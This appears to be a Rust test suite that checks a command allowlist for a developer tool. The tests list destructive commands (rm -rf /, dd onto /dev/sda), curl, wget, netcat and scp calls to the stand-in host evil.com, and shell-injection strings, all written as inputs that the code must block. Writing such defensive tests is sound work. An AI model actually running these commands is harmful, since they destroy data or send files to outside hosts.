//! Command injection prevention tests
//!
//! These tests verify that safe_command() correctly prevents
//! command injection attacks and only allows whitelisted commands.

use cldev::core::security::{safe_command, SecurityError};

/// Test allowed commands execute successfully
#[test]
fn test_allowed_git_command() {
    let result = safe_command("git", &["status"]);
    assert!(result.is_ok(), "Git command should be allowed");

    let result = safe_command("git", &["log", "--oneline", "-n", "10"]);
    assert!(result.is_ok(), "Git with multiple args should be allowed");
}

/// Test allowed package manager commands
#[test]
fn test_allowed_package_managers() {
    let package_managers = vec![
        ("npm", vec!["install"]),
        ("cargo", vec!["build", "--release"]),
        ("yarn", vec!["add", "react"]),
        ("pnpm", vec!["install"]),
        ("pip", vec!["install", "django"]),
        ("poetry", vec!["add", "requests"]),
    ];

    for (cmd, args) in package_managers {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(
            result.is_ok(),
            "Package manager '{}' should be allowed",
            cmd
        );
    }
}

/// Test allowed build tools
#[test]
fn test_allowed_build_tools() {
    let build_tools = vec![
        ("make", vec!["all"]),
        ("cmake", vec!["."]),
        ("ninja", vec!["-C", "build"]),
    ];

    for (cmd, args) in build_tools {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(result.is_ok(), "Build tool '{}' should be allowed", cmd);
    }
}

/// Test allowed testing frameworks
#[test]
fn test_allowed_test_frameworks() {
    let test_tools = vec![
        ("pytest", vec!["tests/"]),
        ("jest", vec!["--coverage"]),
        ("vitest", vec!["run"]),
    ];

    for (cmd, args) in test_tools {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(result.is_ok(), "Test framework '{}' should be allowed", cmd);
    }
}

/// Test allowed linters and formatters
#[test]
fn test_allowed_linters_formatters() {
    let tools = vec![
        ("eslint", vec!["src/"]),
        ("prettier", vec!["--write", "**/*.ts"]),
        ("rustfmt", vec!["--check"]),
        ("clippy", vec!["--", "-D", "warnings"]),
        ("black", vec!["."]),
        ("ruff", vec!["check"]),
    ];

    for (cmd, args) in tools {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(
            result.is_ok(),
            "Linter/formatter '{}' should be allowed",
            cmd
        );
    }
}

/// Test allowed language runtimes
#[test]
fn test_allowed_language_runtimes() {
    let runtimes = vec![
        ("node", vec!["script.js"]),
        ("python", vec!["main.py"]),
        ("python3", vec!["-m", "pytest"]),
        ("rust", vec!["--version"]),
        ("go", vec!["run", "main.go"]),
    ];

    for (cmd, args) in runtimes {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(result.is_ok(), "Runtime '{}' should be allowed", cmd);
    }
}

/// Test allowed GitHub/GitLab CLI
#[test]
fn test_allowed_git_clis() {
    let git_clis = vec![("gh", vec!["pr", "create"]), ("glab", vec!["mr", "create"])];

    for (cmd, args) in git_clis {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(result.is_ok(), "Git CLI '{}' should be allowed", cmd);
    }
}

/// Test dangerous commands are blocked
#[test]
fn test_blocked_dangerous_commands() {
    let dangerous_commands = vec![
        ("rm", vec!["-rf", "/"]),
        ("dd", vec!["if=/dev/zero", "of=/dev/sda"]),
        ("mkfs", vec!["/dev/sda1"]),
        ("fdisk", vec!["/dev/sda"]),
        ("chmod", vec!["777", "/etc"]),
        ("chown", vec!["root:root", "/etc/passwd"]),
    ];

    for (cmd, args) in dangerous_commands {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(
            result.is_err(),
            "Dangerous command '{}' should be blocked",
            cmd
        );
        assert!(
            matches!(result, Err(SecurityError::CommandNotAllowed { .. })),
            "Should return CommandNotAllowed error for '{}'",
            cmd
        );
    }
}

/// Test network commands are blocked
#[test]
fn test_blocked_network_commands() {
    let network_commands = vec![
        ("curl", vec!["http://evil.com/malware"]),
        ("wget", vec!["http://evil.com/backdoor"]),
        ("nc", vec!["-l", "1337"]),
        ("netcat", vec!["evil.com", "4444"]),
        ("ssh", vec!["user@evil.com"]),
        ("scp", vec!["file.txt", "user@evil.com:/tmp"]),
    ];

    for (cmd, args) in network_commands {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(
            result.is_err(),
            "Network command '{}' should be blocked",
            cmd
        );
    }
}

/// Test shell commands are blocked
#[test]
fn test_blocked_shell_commands() {
    let shell_commands = vec![
        ("sh", vec!["-c", "rm -rf /"]),
        ("bash", vec!["-c", "evil command"]),
        ("zsh", vec!["-c", "malicious"]),
        ("fish", vec!["-c", "bad"]),
    ];

    for (cmd, args) in shell_commands {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command(cmd, &args_refs);
        assert!(result.is_err(), "Shell command '{}' should be blocked", cmd);
    }
}

/// Test command injection via arguments is prevented
#[test]
fn test_command_injection_via_arguments() {
    // Even if we try to inject commands via arguments, std::process::Command
    // doesn't execute them through a shell
    let injection_attempts = vec![
        vec!["status", ";", "rm", "-rf", "/"],
        vec!["status", "&&", "malicious"],
        vec!["status", "|", "evil"],
        vec!["status", "`malicious`"],
        vec!["status", "$(evil)"],
    ];

    for args in injection_attempts {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command("git", &args_refs);

        // Command creation should succeed because we're using std::process::Command
        assert!(
            result.is_ok(),
            "Command creation should succeed (injection prevented by Command API)"
        );

        // The key security here is that std::process::Command doesn't use shell expansion,
        // so these special characters are passed as literal arguments, not interpreted
        let cmd = result.unwrap();

        // We don't execute the command, but verify it was created safely
        // (no shell expansion will occur)
        let program = cmd.get_program();
        assert_eq!(program, "git", "Program should still be git");
    }
}

/// Test shell metacharacters in arguments are treated literally
#[test]
fn test_shell_metacharacters_literal() {
    // Characters that would be dangerous in shell are safe with std::process::Command
    let safe_with_command_api = vec![
        vec!["commit", "-m", "Message with semicolon; here"],
        vec!["commit", "-m", "Message with pipe | here"],
        vec!["commit", "-m", "Message with ampersand & here"],
        vec!["commit", "-m", "Message with backtick ` here"],
        vec!["commit", "-m", "Message with $(subshell) here"],
    ];

    for args in safe_with_command_api {
        let args_refs: Vec<&str> = args.iter().map(|s| s.as_ref()).collect();
        let result = safe_command("git", &args_refs);

        assert!(
            result.is_ok(),
            "Metacharacters in arguments should be safe with Command API"
        );

        // Verify the command was created correctly
        let cmd = result.unwrap();
        assert_eq!(cmd.get_program(), "git");
    }
}

/// Test empty command is rejected
#[test]
fn test_empty_command() {
    let result = safe_command("", &[]);
    assert!(result.is_err(), "Empty command should be rejected");
}

/// Test case sensitivity
#[test]
fn test_command_case_sensitivity() {
    // Command names should be case-sensitive
    let result = safe_command("GIT", &["status"]);
    assert!(
        result.is_err(),
        "Uppercase GIT should be rejected (case-sensitive)"
    );

    let result = safe_command("Git", &["status"]);
    assert!(
        result.is_err(),
        "Mixed-case Git should be rejected (case-sensitive)"
    );

    // Only lowercase should work
    let result = safe_command("git", &["status"]);
    assert!(result.is_ok(), "Lowercase git should be allowed");
}

/// Test command with no arguments
#[test]
fn test_command_no_arguments() {
    let result = safe_command("git", &[]);
    assert!(
        result.is_ok(),
        "Commands with no arguments should be allowed"
    );
}

/// Test command builder returns usable Command
#[test]
fn test_command_builder_usable() {
    let result = safe_command("git", &["--version"]);
    assert!(result.is_ok());

    let mut cmd = result.unwrap();

    // Verify we can execute the command
    let output = cmd.output();
    assert!(output.is_ok(), "Command should be executable");

    // Verify git --version produces output
    let output = output.unwrap();
    assert!(output.status.success(), "Command should succeed");
    assert!(!output.stdout.is_empty(), "Command should produce output");
}

/// Benchmark: Command creation performance
#[test]
fn test_command_creation_performance() {
    let iterations = 10000;
    let start = std::time::Instant::now();

    for _ in 0..iterations {
        let _ = safe_command("git", &["status"]);
    }

    let duration = start.elapsed();
    let avg_microseconds = duration.as_micros() / iterations;

    // Command creation should be very fast (< 10 microseconds average)
    assert!(
        avg_microseconds < 10,
        "Command creation too slow: {} microseconds average",
        avg_microseconds
    );
}

/// Test all allowed commands in one comprehensive test
#[test]
fn test_all_allowed_commands() {
    let allowed_commands = vec![
        "git", "npm", "cargo", "yarn", "pnpm", "pip", "poetry", "make", "cmake", "ninja", "pytest",
        "jest", "vitest", "eslint", "prettier", "rustfmt", "clippy", "black", "ruff", "node",
        "python", "python3", "rust", "go", "gh", "glab",
    ];

    for cmd in allowed_commands {
        let result = safe_command(cmd, &["--help"]);
        assert!(result.is_ok(), "Command '{}' should be allowed", cmd);
    }
}
